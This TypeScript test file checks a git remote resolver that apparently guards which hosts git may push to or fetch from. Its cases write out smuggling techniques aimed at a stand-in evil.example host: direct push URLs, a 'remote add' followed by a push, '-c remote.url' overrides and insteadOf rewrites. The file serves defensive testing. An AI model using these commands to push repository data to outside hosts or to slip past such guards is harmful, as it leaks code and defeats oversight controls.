import { describe, it, expect } from "vitest";
import {
	resolveGitRemote,
	parseGitArgv,
	extractMutationsFromArgv,
} from "../../src/git/resolve-remote.js";
import {
	parseGitConfig,
	configFromFlat,
} from "../../src/git/parse-config.js";

const ORIGIN_CONFIG = parseGitConfig(`[remote "origin"]
	url = https://github.com/foo/bar
[remote "secondary"]
	url = https://example.com/r
	pushurl = https://push.example.com/r
`);

describe("resolveGitRemote — direct argv URL (the basic smuggle vector)", () => {
	it("git push https://evil.example/x → urls=[that URL]", () => {
		const r = resolveGitRemote(
			{ verb: "push", remoteArg: "https://evil.example/x" },
			ORIGIN_CONFIG,
		);
		expect(r.resolved).toBe(true);
		expect(r.source).toBe("argv_url");
		expect(r.urls).toEqual(["https://evil.example/x"]);
	});

	it("git push git@github.com:foo/bar.git (scp-like) → resolved", () => {
		const r = resolveGitRemote(
			{ verb: "push", remoteArg: "git@github.com:foo/bar.git" },
			ORIGIN_CONFIG,
		);
		expect(r.resolved).toBe(true);
		expect(r.urls).toEqual(["git@github.com:foo/bar.git"]);
	});

	it("git fetch ssh://… (alt scheme) → argv_url path used", () => {
		const r = resolveGitRemote(
			{ verb: "fetch", remoteArg: "ssh://git@example.com/r" },
			ORIGIN_CONFIG,
		);
		expect(r.source).toBe("argv_url");
	});
});

describe("resolveGitRemote — named remote", () => {
	it("git push origin → resolves origin url", () => {
		const r = resolveGitRemote(
			{ verb: "push", remoteArg: "origin" },
			ORIGIN_CONFIG,
		);
		expect(r.resolved).toBe(true);
		expect(r.urls).toEqual(["https://github.com/foo/bar"]);
		expect(r.source).toBe("remote_name");
	});

	it("git push secondary → returns pushurl in push_urls field", () => {
		const r = resolveGitRemote(
			{ verb: "push", remoteArg: "secondary" },
			ORIGIN_CONFIG,
		);
		expect(r.urls).toEqual(["https://example.com/r"]);
		expect(r.push_urls).toEqual(["https://push.example.com/r"]);
	});

	it("git push (no arg) → falls back to origin", () => {
		const r = resolveGitRemote({ verb: "push" }, ORIGIN_CONFIG);
		expect(r.resolved).toBe(true);
		expect(r.source).toBe("default_origin");
		expect(r.urls).toEqual(["https://github.com/foo/bar"]);
	});

	it("git push UNKNOWN → unresolved (deny under taint)", () => {
		const r = resolveGitRemote(
			{ verb: "push", remoteArg: "unknown" },
			ORIGIN_CONFIG,
		);
		expect(r.resolved).toBe(false);
		expect(r.source).toBe("unresolved");
	});
});

describe("resolveGitRemote — same-command remote-add smuggle (A6b)", () => {
	it("git remote add x evil; git push x → resolves to evil via mutations", () => {
		const r = resolveGitRemote(
			{
				verb: "push",
				remoteArg: "x",
				configMutations: { "remote.x.url": "https://evil.example/x" },
			},
			ORIGIN_CONFIG,
		);
		expect(r.resolved).toBe(true);
		expect(r.urls).toEqual(["https://evil.example/x"]);
		expect(r.source).toBe("remote_added_in_command");
	});

	it("git config remote.x.url evil; git push x → mutation overrides absence", () => {
		const r = resolveGitRemote(
			{
				verb: "push",
				remoteArg: "x",
				configMutations: { "remote.x.url": "https://evil.example/x" },
			},
			ORIGIN_CONFIG,
		);
		expect(r.urls).toEqual(["https://evil.example/x"]);
	});
});

describe("resolveGitRemote — -c flag override smuggle (A6c)", () => {
	it("git -c remote.origin.url=evil push origin → resolves to evil", () => {
		const r = resolveGitRemote(
			{
				verb: "push",
				remoteArg: "origin",
				cFlags: { "remote.origin.url": "https://evil.example/x" },
			},
			ORIGIN_CONFIG,
		);
		expect(r.resolved).toBe(true);
		expect(r.urls).toEqual(["https://evil.example/x"]);
		expect(r.source).toBe("c_flag_override");
	});

	it("-c is applied AFTER mutations (cFlags wins over remote add)", () => {
		const r = resolveGitRemote(
			{
				verb: "push",
				remoteArg: "x",
				configMutations: { "remote.x.url": "https://stage1/" },
				cFlags: { "remote.x.url": "https://final/" },
			},
			ORIGIN_CONFIG,
		);
		expect(r.urls).toEqual(["https://final/"]);
		expect(r.source).toBe("c_flag_override");
	});
});

describe("resolveGitRemote — url.insteadOf rewriting", () => {
	const cfg = parseGitConfig(`[url "https://evil.example/"]
	insteadOf = https://github.com/
[remote "origin"]
	url = https://github.com/foo/bar
`);

	it("url.insteadOf rewrites the resolved fetch URL to evil", () => {
		const r = resolveGitRemote(
			{ verb: "fetch", remoteArg: "origin" },
			cfg,
		);
		expect(r.resolved).toBe(true);
		expect(r.urls).toEqual(["https://evil.example/foo/bar"]);
		expect(r.applied_rewrites).toHaveLength(1);
		expect(r.applied_rewrites[0].rule).toContain("insteadOf");
	});

	it("longest-prefix-wins among multiple insteadOf rules", () => {
		const c = parseGitConfig(`[url "https://a/"]
	insteadOf = https://github.com/
[url "https://b/"]
	insteadOf = https://github.com/foo/
[remote "origin"]
	url = https://github.com/foo/bar
`);
		const r = resolveGitRemote(
			{ verb: "fetch", remoteArg: "origin" },
			c,
		);
		// "https://github.com/foo/" is longer than "https://github.com/"
		// so prefix b wins.
		expect(r.urls).toEqual(["https://b/bar"]);
	});

	it("pushInsteadOf rewrites only on push, not fetch", () => {
		const c = parseGitConfig(`[url "https://push-target/"]
	pushInsteadOf = https://github.com/
[remote "origin"]
	url = https://github.com/foo/bar
`);
		const fetchR = resolveGitRemote(
			{ verb: "fetch", remoteArg: "origin" },
			c,
		);
		expect(fetchR.urls).toEqual(["https://github.com/foo/bar"]);
		const pushR = resolveGitRemote(
			{ verb: "push", remoteArg: "origin" },
			c,
		);
		expect(pushR.urls).toEqual(["https://push-target/foo/bar"]);
	});
});

describe("resolveGitRemote — non-network verbs", () => {
	it("git status → resolved=true, urls=[], skip allowlist", () => {
		const r = resolveGitRemote({ verb: "status" }, ORIGIN_CONFIG);
		expect(r.resolved).toBe(true);
		expect(r.urls).toEqual([]);
	});

	it("git commit → no URL resolution", () => {
		const r = resolveGitRemote({ verb: "commit" }, ORIGIN_CONFIG);
		expect(r.urls).toEqual([]);
	});
});

describe("parseGitArgv — extract verb / remoteArg / cFlags", () => {
	it("git push origin → {verb:push, remoteArg:origin}", () => {
		const r = parseGitArgv(["git", "push", "origin"]);
		expect(r).toEqual({ verb: "push", remoteArg: "origin", cFlags: {} });
	});

	it("git -c remote.x.url=evil push x", () => {
		const r = parseGitArgv([
			"git",
			"-c",
			"remote.x.url=evil",
			"push",
			"x",
		]);
		expect(r).toEqual({
			verb: "push",
			remoteArg: "x",
			cFlags: { "remote.x.url": "evil" },
		});
	});

	it("git push --force origin main → main is NOT remoteArg (refspec)", () => {
		// --force is a flag, origin is the first positional → remoteArg
		// is "origin". main is a refspec, ignored by the resolver.
		const r = parseGitArgv(["git", "push", "--force", "origin", "main"]);
		expect(r?.remoteArg).toBe("origin");
	});

	it("non-git argv returns null", () => {
		expect(parseGitArgv(["ls", "-la"])).toBeNull();
	});

	it("absolute git path /usr/bin/git is recognized", () => {
		const r = parseGitArgv(["/usr/bin/git", "push", "origin"]);
		expect(r?.verb).toBe("push");
	});
});

describe("extractMutationsFromArgv — sequence accumulator", () => {
	it("collects remote-add mutations from earlier commands in sequence", () => {
		const m = extractMutationsFromArgv([
			["git", "remote", "add", "x", "https://evil/x"],
			["git", "push", "x", "main"],
		]);
		expect(m).toEqual({ "remote.x.url": "https://evil/x" });
	});

	it("collects git config remote.X.url mutations", () => {
		const m = extractMutationsFromArgv([
			["git", "config", "remote.x.url", "https://evil/x"],
			["git", "push", "x"],
		]);
		expect(m).toEqual({ "remote.x.url": "https://evil/x" });
	});

	it("ignores non-git commands in the sequence", () => {
		const m = extractMutationsFromArgv([
			["echo", "hi"],
			["git", "remote", "add", "x", "https://evil/x"],
		]);
		expect(m).toEqual({ "remote.x.url": "https://evil/x" });
	});

	it("multiple add-then-overwrite: last wins", () => {
		const m = extractMutationsFromArgv([
			["git", "remote", "add", "x", "https://first/"],
			["git", "config", "remote.x.url", "https://second/"],
		]);
		expect(m["remote.x.url"]).toBe("https://second/");
	});
});

describe("end-to-end: A6b smuggle with extracted mutations and resolver", () => {
	it("git remote add x evil; git push x → resolved to evil URL", () => {
		const argvList = [
			["git", "remote", "add", "x", "https://evil.example/x"],
			["git", "push", "x", "main"],
		];
		const mutations = extractMutationsFromArgv(argvList);
		const last = parseGitArgv(argvList[argvList.length - 1])!;
		const r = resolveGitRemote(
			{ verb: last.verb, remoteArg: last.remoteArg, cFlags: last.cFlags, configMutations: mutations },
			ORIGIN_CONFIG,
		);
		expect(r.resolved).toBe(true);
		expect(r.urls).toEqual(["https://evil.example/x"]);
		expect(r.source).toBe("remote_added_in_command");
	});

	it("if `git remote add` happens AFTER `git push x`, the push remains unresolved", () => {
		// Order matters: extractMutationsFromArgv accumulates everything,
		// but the caller is expected to slice the sequence at the verb.
		// Here we simulate that by only passing the prefix.
		const prefix = [["git", "push", "x", "main"]];
		const mutations = extractMutationsFromArgv(prefix);
		const r = resolveGitRemote(
			{
				verb: "push",
				remoteArg: "x",
				configMutations: mutations,
			},
			ORIGIN_CONFIG,
		);
		expect(r.resolved).toBe(false);
	});
});
